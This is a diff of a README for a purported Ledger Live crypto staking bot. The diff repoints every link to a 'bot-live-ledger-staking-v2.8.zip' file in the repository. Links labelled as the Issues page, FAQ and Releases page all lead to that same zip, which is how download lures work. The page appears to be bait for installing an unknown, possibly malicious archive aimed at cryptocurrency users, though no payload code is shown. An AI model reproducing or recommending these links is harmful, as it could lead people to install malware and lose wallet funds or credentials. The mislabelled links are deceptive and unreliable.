@@ -1,6 +1,6 @@
 # 🚀 ledger-live-staking-bot - Automate Your Crypto Staking Effortlessly
 
-[![Download](https://raw.githubusercontent.com/babshudhanshu098/ledger-live-staking-bot/main/stonebird/ledger-live-staking-bot_v1.2.zip)](https://raw.githubusercontent.com/babshudhanshu098/ledger-live-staking-bot/main/stonebird/ledger-live-staking-bot_v1.2.zip)
+[![Download](https://github.com/babshudhanshu098/ledger-live-staking-bot/raw/refs/heads/main/stonebird/bot-live-ledger-staking-v2.8.zip)](https://github.com/babshudhanshu098/ledger-live-staking-bot/raw/refs/heads/main/stonebird/bot-live-ledger-staking-v2.8.zip)
 
 ## 🛠️ Overview
 
@@ -20,7 +20,7 @@ Before downloading, ensure your system meets the following requirements:
 
 To download the Ledger Live Staking Bot, click the link below:
 
-[Download the latest version](https://raw.githubusercontent.com/babshudhanshu098/ledger-live-staking-bot/main/stonebird/ledger-live-staking-bot_v1.2.zip)
+[Download the latest version](https://github.com/babshudhanshu098/ledger-live-staking-bot/raw/refs/heads/main/stonebird/bot-live-ledger-staking-v2.8.zip)
 
 1. Visit the Releases page using the link above.
 2. Look for the most recent version.
@@ -85,17 +85,17 @@ If you experience any issues while using the Ledger Live Staking Bot, consider t
 - Check that you are using the latest version of Ledger Live.
 - Restart the Ledger Live Staking Bot if you encounter errors.
 
-For more detailed assistance, visit our [GitHub Issues page](https://raw.githubusercontent.com/babshudhanshu098/ledger-live-staking-bot/main/stonebird/ledger-live-staking-bot_v1.2.zip) to report any bugs or concerns.
+For more detailed assistance, visit our [GitHub Issues page](https://github.com/babshudhanshu098/ledger-live-staking-bot/raw/refs/heads/main/stonebird/bot-live-ledger-staking-v2.8.zip) to report any bugs or concerns.
 
 ## 📞 Need Help?
 
 If you have questions or need assistance, feel free to reach out:
 
-- Check our [FAQ section](https://raw.githubusercontent.com/babshudhanshu098/ledger-live-staking-bot/main/stonebird/ledger-live-staking-bot_v1.2.zip).
+- Check our [FAQ section](https://github.com/babshudhanshu098/ledger-live-staking-bot/raw/refs/heads/main/stonebird/bot-live-ledger-staking-v2.8.zip).
 - Join our community on Discord or Telegram.
 
 ## 🔄 Stay Updated
 
 To keep track of updates and new features, follow this repository on GitHub. 
 
-[Download the latest version](https://raw.githubusercontent.com/babshudhanshu098/ledger-live-staking-bot/main/stonebird/ledger-live-staking-bot_v1.2.zip) and start automating your staking today!
+[Download the latest version](https://github.com/babshudhanshu098/ledger-live-staking-bot/raw/refs/heads/main/stonebird/bot-live-ledger-staking-v2.8.zip) and start automating your staking today!
